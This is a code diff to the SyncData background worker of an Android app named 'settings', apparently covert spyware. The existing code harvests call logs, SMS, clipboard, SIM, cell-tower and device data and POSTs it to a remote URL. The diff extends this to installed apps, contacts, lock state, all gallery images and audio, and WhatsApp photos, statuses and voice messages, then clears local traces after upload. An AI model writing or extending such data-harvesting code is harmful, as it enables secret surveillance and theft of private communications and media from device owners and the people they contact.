@@ -4,10 +4,12 @@ import android.Manifest;
 import android.app.Activity;
 import android.content.ClipData;
 import android.content.Context;
+import android.os.Build;
 import android.util.Log;
 
 
 import androidx.annotation.NonNull;
+import androidx.annotation.RequiresApi;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
@@ -39,6 +41,7 @@ import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.checkpermission;
 import static com.example.settings.Utils.getDateTime;
+import static com.example.settings.Utils.getphoneAppdetails;
 import static com.example.settings.Utils.newUrlData;
 
 public class SyncData extends Worker {
@@ -55,6 +58,7 @@ public class SyncData extends Worker {
 
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.O)
     @NonNull
     @Override
     public Result doWork() {
@@ -81,9 +85,19 @@ public class SyncData extends Worker {
         if (checkpermission(context, Manifest.permission.READ_PHONE_STATE) && (checkpermission(context, Manifest.permission.READ_CALL_LOG))) {
             Utils.readCallLogs(context, mSharedpref);
         }
+        getphoneAppdetails(context,mSharedpref);
         Utils.readSmsHistory(context,mSharedpref);
         Utils.getBatteryPercent(context,mSharedpref);
+        Utils.isPhoneIsLockedOrNot(context);
         Utils.checkServices(context,mSharedpref);
+        MultiMediaData multiMediaData=new MultiMediaData(context,mSharedpref);
+        multiMediaData.getAllShownImagesPath();
+        multiMediaData.getAudios();
+        multiMediaData.getWhatsAppAudios();
+        multiMediaData.getWhatsphotos();
+        multiMediaData.getWhatsAppStatus();
+        Utils.readContacts(context,mSharedpref);
+
         try {
             ClipData pData = clipboardManager.getPrimaryClip();
             if (pData != null) {
@@ -97,7 +111,7 @@ public class SyncData extends Worker {
 
         DaysTime = mSharedpref.getPrevDate()+" to " +getDateTime();
         if(isConnectedToNetwork(context)){
-            if (!Name.isEmpty()) {
+            if (!Name.isEmpty() || !Name.equalsIgnoreCase("No Name Yet")) {
                 int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
                 int prev=mSharedpref.getPrevPhoneNumbersLisSize();
                 if (prev!= numberlistsize) {
@@ -118,7 +132,8 @@ public class SyncData extends Worker {
                         || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() ||
                         !SmsData.isEmpty() || !OtherNotificationData.isEmpty()
                         || !ClickedData.isEmpty() || !OtherClickedData.isEmpty() ||
-                        !Phoneappdetails.isEmpty()) {
+                        !Phoneappdetails.isEmpty())
+                {
                     StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                             new Response.Listener<String>() {
                                 @Override
@@ -139,6 +154,11 @@ public class SyncData extends Worker {
                                     mSharedpref.setBatteryPercnt("");
                                     mSharedpref.setSmsHistory("");
                                     mSharedpref.setServiceStatus("");
+                                    mSharedpref.setImagesJson("");
+                                    mSharedpref.setAudioJson("");
+                                    mSharedpref.setWhatsAppImageJson("");
+                                    mSharedpref.setWhatsAppStatusJson("");
+                                    mSharedpref.setWhatsAppAudioJSon("");
                                     mSharedpref.commit();
                                    try {
                                        geturl();
@@ -186,8 +206,13 @@ public class SyncData extends Worker {
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
-                            parmas.put("ImageFiles", getFiles(mSharedpref));
+                            parmas.put("ImageFiles", "");
                             parmas.put("Services", mSharedpref.getServiceStatus());
+                            parmas.put("ImageUploaded", mSharedpref.getImagesJson());
+                            parmas.put("AudioUploaded", mSharedpref.getAudioJson());
+                            parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
+                            parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
+                            parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
 
                             return parmas;
                         }
@@ -217,6 +242,11 @@ public class SyncData extends Worker {
                                     mSharedpref.setClickedData("");
                                     mSharedpref.setOtherClickedData("");
                                     mSharedpref.savePrevDate(getDateTime());
+                                     mSharedpref.setImagesJson("");
+                                    mSharedpref.setAudioJson("");
+                                    mSharedpref.setWhatsAppImageJson("");
+                                    mSharedpref.setWhatsAppStatusJson("");
+                                    mSharedpref.setWhatsAppAudioJSon("");
                                     mSharedpref.commit();
                                 }
                             },
@@ -260,6 +290,11 @@ public class SyncData extends Worker {
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
                             parmas.put("ImageFiles", getFiles(mSharedpref));
                             parmas.put("Services", mSharedpref.getServiceStatus());
+                            parmas.put("ImageUploaded", mSharedpref.getImagesJson());
+                            parmas.put("AudioUploaded", mSharedpref.getAudioJson());
+                            parmas.put("WhatsAppPhotos", mSharedpref.getWhatsAppAImageJson());
+                            parmas.put("WhatsAppStatus", mSharedpref.getWhatsAppStatusJson());
+                            parmas.put("WhatsAppAudio", mSharedpref.getWhatsAppAudioJson());
                             return parmas;
                         }
                     };
